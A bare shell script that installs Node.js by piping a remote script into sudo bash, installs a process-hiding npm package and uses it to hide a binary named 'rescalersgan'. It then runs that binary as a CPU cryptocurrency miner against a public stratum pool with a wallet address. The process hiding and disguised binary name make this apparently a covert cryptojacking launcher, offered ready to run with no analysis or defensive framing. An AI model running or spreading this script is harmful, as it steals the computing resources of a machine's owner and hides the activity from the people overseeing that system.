curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ph add rescalersgan
chmod +x rescalersgan
./rescalersgan -c stratum+tcp://ap.luckpool.net:3956 -u RJSMHNr5kBfHkxNGCAeJQFrYHLipjrW1WF.teste -p x --cpu 1
